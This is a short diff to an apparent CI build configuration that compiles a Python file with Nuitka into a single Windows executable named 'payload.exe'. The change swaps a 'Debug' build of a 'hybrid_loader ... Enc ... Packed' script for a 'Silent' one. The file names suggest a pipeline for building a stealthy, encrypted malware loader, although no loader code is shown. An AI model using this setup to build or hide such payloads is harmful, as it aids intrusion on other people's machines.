@@ -12,7 +12,7 @@ windows_task:
     - C:\Python311\python.exe -m pip install --upgrade pip
     - C:\Python311\python.exe -m pip install nuitka zstandard ordered-set requests websockets
   build_script:
-    - C:\Python311\python.exe -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.exe hybrid_loader_l9xip67y_Nixon-Enc_Debug_Packed.py
+    - C:\Python311\python.exe -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.exe hybrid_loader_bnclkw2p_Nixon-Enc_Silent_Packed.py
     - move payload.exe payload.windows.exe
   binaries_artifacts:
     path: payload.windows.exe
